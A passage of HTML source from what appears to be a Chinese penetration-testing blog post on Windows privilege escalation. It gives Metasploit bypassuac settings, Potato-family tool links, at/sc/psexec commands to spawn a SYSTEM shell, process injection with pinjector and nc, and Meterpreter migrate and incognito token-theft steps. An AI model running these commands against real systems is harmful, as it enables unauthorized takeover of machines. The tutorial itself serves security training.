+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/17_hu_27b920bde7c73dd4.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/17_hu_6cb972a17ea240d7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="110"
+		data-flex-basis="265px"
+	
+></p>
+<p><strong>每次更改需要重新启动系统</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bypassuac</span><span class="w"> 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里在<strong>尝试使用getsystem提权，发现无法提权，那么就需要使用UAC进行绕过</strong>了</p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/18.png"
+	width="1360"
+	height="442"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/18_hu_abb92702101256aa.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/18_hu_e89786deadc1f754.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="307"
+		data-flex-basis="738px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">search</span><span class="w"> </span><span class="n">uac</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/19.png"
+	width="1511"
+	height="832"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/19_hu_f80acc91d34155ef.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/19_hu_d22fcfe95d215025.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="435px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bypassuac</span><span class="w">     </span><span class="err">##</span><span class="n">选择bypass</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">options</span><span class="w">                               </span><span class="err">##</span><span class="n">查看选项</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">1</span><span class="w">                           </span><span class="err">##</span><span class="n">设定会话</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">lport</span><span class="w"> </span><span class="n">5555</span><span class="w">   </span><span class="err">##</span><span class="n">设定反弹端口</span><span class="err">，</span><span class="n">这里不设置也可以</span><span class="err">，</span><span class="n">但是有时候直接反弹回来</span><span class="err">，</span><span class="n">会出现反弹不成功的情况</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">run</span><span class="w">                                     </span><span class="err">##</span><span class="n">执行</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/20.png"
+	width="1376"
+	height="731"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/20_hu_bb5d583d7a724362.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/20_hu_185a1cbc5f64a4eb.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="188"
+		data-flex-basis="451px"
+	
+></p>
+<h2 id="16土豆家族提权">1.6.土豆家族提权
+</h2><p><a class="link" href="https://blog.csdn.net/qq_42699326/article/details/144334216"  target="_blank" rel="noopener"
+    >window提权之土豆家族_sweetpotato提权-CSDN博客</a></p>
+<p><a class="link" href="https://zhuanlan.zhihu.com/p/324113936"  target="_blank" rel="noopener"
+    >https://zhuanlan.zhihu.com/p/324113936</a></p>
+<p><strong>利用土豆家族提权的前提条件是拥有SelmpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限，以下用户拥有SelmpersonatePrivilege权限（而只有更高权限的账户比如SYSTEM才有SeAssignPrimaryTokenPrivilege权限）：</strong></p>
+<p><strong>本地管理员账户（不包括管理员组普通账户）和本地服务账户</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">24767</span><span class="o">&gt;</span><span class="n">whoami</span><span class="w"> </span><span class="o">/</span><span class="n">priv</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">特权名</span><span class="w">                          </span><span class="n">描述</span><span class="w">                       </span><span class="n">状态</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">===============================</span><span class="w"> </span><span class="o">==========================</span><span class="w"> </span><span class="o">=====</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeAssignPrimaryTokenPrivilege</span><span class="w">   </span><span class="n">替换一个进程级令牌</span><span class="w">         </span><span class="n">已禁用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeLockMemoryPrivilege</span><span class="w">           </span><span class="n">锁定内存页</span><span class="w">                 </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeIncreaseQuotaPrivilege</span><span class="w">        </span><span class="n">为进程调整内存配额</span><span class="w">         </span><span class="n">已禁用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeTcbPrivilege</span><span class="w">                  </span><span class="n">以操作系统方式执行</span><span class="w">         </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeSecurityPrivilege</span><span class="w">             </span><span class="n">管理审核和安全日志</span><span class="w">         </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeTakeOwnershipPrivilege</span><span class="w">        </span><span class="n">取得文件或其他对象的所有权</span><span class="w"> </span><span class="n">已禁用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeLoadDriverPrivilege</span><span class="w">           </span><span class="n">加载和卸载设备驱动程序</span><span class="w">     </span><span class="n">已禁用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeProfileSingleProcessPrivilege</span><span class="w"> </span><span class="n">配置文件单个进程</span><span class="w">           </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeIncreaseBasePriorityPrivilege</span><span class="w"> </span><span class="n">提高计划优先级</span><span class="w">             </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeCreatePagefilePrivilege</span><span class="w">       </span><span class="n">创建一个页面文件</span><span class="w">           </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeCreatePermanentPrivilege</span><span class="w">      </span><span class="n">创建永久共享对象</span><span class="w">           </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeRestorePrivilege</span><span class="w">              </span><span class="n">还原文件和目录</span><span class="w">             </span><span class="n">已禁用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeShutdownPrivilege</span><span class="w">             </span><span class="n">关闭系统</span><span class="w">                   </span><span class="n">已禁用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeAuditPrivilege</span><span class="w">                </span><span class="n">生成安全审核</span><span class="w">               </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeChangeNotifyPrivilege</span><span class="w">         </span><span class="n">绕过遍历检查</span><span class="w">               </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeImpersonatePrivilege</span><span class="w">          </span><span class="n">身份验证后模拟客户端</span><span class="w">       </span><span class="n">已启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SeCreateGlobalPrivilege</span><span class="w">         </span><span class="n">创建全局对象</span><span class="w">               </span><span class="n">已启用</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://blog.csdn.net/m0_74402888/article/details/144066919"  target="_blank" rel="noopener"
+    >DAY133权限提升-Windows权限提升篇&amp;溢出漏洞&amp;土豆家族&amp;通杀全系&amp;补丁对比&amp;EXP筛选_badpotato.exe-CSDN博客</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">https://github.com/BeichenDream/GodPotato
+</span></span><span class="line"><span class="cl">https://github.com/antonioCoco/RoguePotato
+</span></span><span class="line"><span class="cl">https://github.com/wh0amitz/PetitPotato
+</span></span><span class="line"><span class="cl">https://github.com/antonioCoco/JuicyPotatoNG
+</span></span><span class="line"><span class="cl">https://github.com/BeichenDream/PrintNotifyPotato
+</span></span><span class="line"><span class="cl">https://github.com/BeichenDream/PrintNotifyPotato
+</span></span><span class="line"><span class="cl">https://github.com/zcgonvh/EfsPotato
+</span></span><span class="line"><span class="cl">https://github.com/klezVirus/CandyPotato
+</span></span><span class="line"><span class="cl">https://github.com/crisprss/RasmanPotato
+</span></span><span class="line"><span class="cl">https://github.com/S3cur3Th1sSh1t/MultiPotato
+</span></span><span class="line"><span class="cl">https://github.com/CCob/SweetPotato
+</span></span><span class="line"><span class="cl">https://github.com/Prepouce/CoercedPotato
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="161juicy-potato"><strong>1.6.1.Juicy Potato</strong>
+</h3><p><a class="link" href="https://github.com/ohpe/juicy-potato"  target="_blank" rel="noopener"
+    ><strong>https://github.com/ohpe/juicy-potato</strong></a></p>
+<p>功能: <font style="color:#DF2A3F;">基于 COM 对象的 DCOM 提权。</font></p>
+<p>适用系统: Windows Server 2008/2012/2016，Windows 7/10。</p>
+<p><strong>机制: 利用 NT AUTHORITY\LOCAL SERVICE 或 NETWORK SERVICE 的特权，通过指定的 CLSID 和 COM 服务劫持 SYSTEM 权限。</strong></p>
+<h3 id="162rotten-potato"><strong>1.6.2.Rotten Potato</strong>
+</h3><p><strong><font style="color:rgb(77, 77, 77);">功能: </font></strong><font style="color:#ED740C;">利用 NTLM 反射实现提权。</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">适用系统: Windows 7/10。</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">机制: 使用 Token Impersonation 技术，通过恶意 COM 对象劫持 SYSTEM Token。</font></strong></p>
+<h3 id="163sweet-potato">1.6.3.Sweet Potato
+</h3><p><a class="link" href="https://github.com/CCob/SweetPotato"  target="_blank" rel="noopener"
+    >https://github.com/CCob/SweetPotato</a></p>
+<p><strong><font style="color:rgb(77, 77, 77);">功能: </font></strong><font style="color:#ECAA04;">针对 JuicyPotato 不适用的现代系统进行提权。</font></p>
+<p><strong><font style="color:rgb(77, 77, 77);">适用系统: Windows Server 2019，Windows 10（新版）。</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">机制: 同样基于 COM 对象的漏洞，但兼容性更强，适配新系统。</font></strong></p>
+<h3 id="164printspoofer">1.6.4.printSpoofer
+</h3><p><a class="link" href="https://github.com/BeichenDream/PrintNotifyPotato"  target="_blank" rel="noopener"
+    >https://github.com/BeichenDream/PrintNotifyPotato</a></p>
+<p><a class="link" href="https://github.com/itm4n/PrintSpoofer"  target="_blank" rel="noopener"
+    >https://github.com/itm4n/PrintSpoofer</a></p>
+<p><strong><font style="color:rgb(77, 77, 77);">功能: 针对 Windows 打印服务的漏洞进行提权。</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">适用系统: Windows Server 2016/2019，Windows 10。</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">机制: 滥用打印假脱机程序（Print Spooler）的权限进行 Token Impersonation。</font></strong></p>
+<h3 id="roguepotato"><strong><font style="color:rgb(77, 77, 77);">1.6.5.</font></strong><font style="color:rgb(77, 77, 77);">RoguePotato</font>
+</h3><p><a class="link" href="https://github.com/antonioCoco/RoguePotato/releases/tag/1.0"  target="_blank" rel="noopener"
+    >https://github.com/antonioCoco/RoguePotato/releases/tag/1.0</a></p>
+<p><strong><font style="color:rgb(77, 77, 77);">功能: 替代 JuicyPotato 的一种新方法。</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">适用系统: Windows Server 2019，Windows 10（新版）。</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">机制: 通过伪造的远程服务与 NTLM 身份验证劫持 SYSTEM Token。</font></strong></p>
+<h2 id=""><strong><font style="color:rgb(77, 77, 77);">1.7.Windows本地计划任务提权&mdash;本地用户</font></strong>
+</h2><p><a class="link" href="https://blog.csdn.net/weixin_71529930/article/details/139430706"  target="_blank" rel="noopener"
+    >第101天：权限提升-Win 本地用户&amp;进程注入&amp;令牌窃取&amp;AT&amp;SC&amp;PS 服务命令-CSDN博客</a></p>
+<h3 id="171at">1.7.1.AT
+</h3><p><strong>适用版本：Win2003，Win7之前</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">at</span><span class="w"> </span><span class="n">21</span><span class="p">:</span><span class="n">00</span><span class="w"> </span><span class="o">/</span><span class="n">interactive</span><span class="w"> </span><span class="n">cmd</span><span class="w">        </span><span class="c1">//在21:00时已System权限运行cmd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="172sc">1.7.2.SC
+</h3><p><strong>适用版本：Win2008之前版本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">创建一个名叫</span><span class="w"> </span><span class="n">syscmd</span><span class="w"> </span><span class="n">的新的交互式的</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="n">执行服务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sc</span><span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">syscmd</span><span class="w"> </span><span class="n">binPath</span><span class="o">=</span><span class="w"> </span><span class="s">&#34;cmd /K start&#34;</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="w"> </span><span class="n">own</span><span class="w"> </span><span class="n">type</span><span class="o">=</span><span class="w"> </span><span class="n">interact</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">运行服务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sc</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="n">syscmd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="173ps">1.7.3.PS
+</h3><p><strong><font style="color:#DF2A3F;">需要初始权限为管理员administrator权限才能执行成功，并且主机是WinServer服务器，不是个人主机，因为这要远程调用PSexec权限</font></strong></p>
+<p><a class="link" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools"  target="_blank" rel="noopener"
+    >PsTools - Sysinternals</a></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/21.png"
+	width="2560"
+	height="1071"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/21_hu_ce7d03e3cb40d84b.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/21_hu_34a56a87a628277a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="573px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">psexec</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">accepteula</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="err">#</span><span class="n">调用运行</span><span class="w"> </span><span class="n">cmd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/22.png"
+	width="1475"
+	height="580"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/22_hu_ddd5347b35dd008b.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/22_hu_bfb52f8332276181.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="610px"
+	
+></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/23.png"
+	width="1448"
+	height="509"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/23_hu_49ef26a262cfcb8a.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/23_hu_9394a33f80a3da99.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="284"
+		data-flex-basis="682px"
+	
+></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/24.png"
+	width="1478"
+	height="768"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/24_hu_3da9168316ded28d.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/24_hu_ffdec8ad1ed7b9bc.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="461px"
+	
+></p>
+<h2 id="18进程迁移注入">1.8.进程迁移注入
+</h2><p><a class="link" href="https://www.cnblogs.com/MGh0st/p/16546473.html"  target="_blank" rel="noopener"
+    >Windows提权 —— 进程注入提权 - MGh0st - 博客园</a></p>
+<p><strong>适用版本：</strong><font style="color:#DF2A3F;">Win2003/Win2008/Win2016，不是低权限用户，最好是administrator权限,有管理员权限都可以试试</font></p>
+<h3 id="181使用pinjector本地进程迁移注入"><strong>1.8.1.使用pinjector本地进程迁移注入</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">pinjector</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">              </span><span class="c1">//列出进程信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">pinjector</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">12304</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="n">6688</span><span class="w">    </span><span class="c1">//将system权限进程注入到本地的6688端口</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nc</span><span class="w"> </span><span class="n">localhost</span><span class="w"> </span><span class="n">6688</span><span class="w">                  </span><span class="c1">//监听本地6688端口</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="182使用msf进程迁移注入">1.8.2.使用MSF进程迁移注入
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">getuid</span><span class="w">       </span><span class="c1">//最好是管理员administrator权限，本地低权限不好迁移</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ps</span><span class="w">          </span><span class="c1">//查看进程号</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">migrate</span><span class="w"> </span><span class="n">376</span><span class="w">       </span><span class="c1">//迁移为system进程</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/25.png"
+	width="1828"
+	height="997"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/25_hu_da0d94bf3475a539.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/25_hu_c4769b4889e2503d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="440px"
+	
+></p>
+<h2 id="19令牌窃取提权">1.9.令牌窃取提权
+</h2><p><strong>适用版本：Win2008/Win2012/Win2016/Win2019</strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">执行的前提是身份一定是</font></strong><font style="color:rgb(254, 44, 36);">大于iis用户，最好是administrator权限，否则无法执行</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">use</span><span class="w"> </span><span class="n">incognito</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">list_tokens</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">impersonate_token</span><span class="w"> </span><span class="s">&#34;NT AUTHORITY\SYSTEM&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/26.png"
+	width="1525"
+	height="1023"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/26_hu_e326b5be863321d9.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/26_hu_b71f2f271e121cf8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="357px"
+	
+></p>
+<h3 id="191烂土豆配合令牌窃取">1.9.1.烂土豆配合令牌窃取
+</h3><p><strong>从IIS权限提升至System权限，</strong><font style="color:rgb(77, 77, 77);">原理是正常上传webshell只能获得web权限，无法提权到system，配合烂土豆，执行，溢出可以获得system权限</font></p>
+<p><a class="link" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe"  target="_blank" rel="noopener"
+    ><strong>https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</strong></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="o">-</span><span class="n">cH</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">potato</span><span class="p">.</span><span class="na">exe</span><span class="w">   </span><span class="err">#</span><span class="n">执行烂土豆程序</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">incognito</span><span class="w">   </span><span class="err">#</span><span class="n">加载窃取模块</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">list_tokens</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w">   </span><span class="err">#</span><span class="n">查看可窃取的令牌</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">impersonate_token</span><span class="w"> </span><span class="s">&#34;NT AUTHORITY\SYSTEM&#34;</span><span class="w">   </span><span class="err">#</span><span class="n">窃取令牌</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="2linux权限提升">2.Linux权限提升
+</h1><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/27.png"
+	width="1962"
+	height="993"
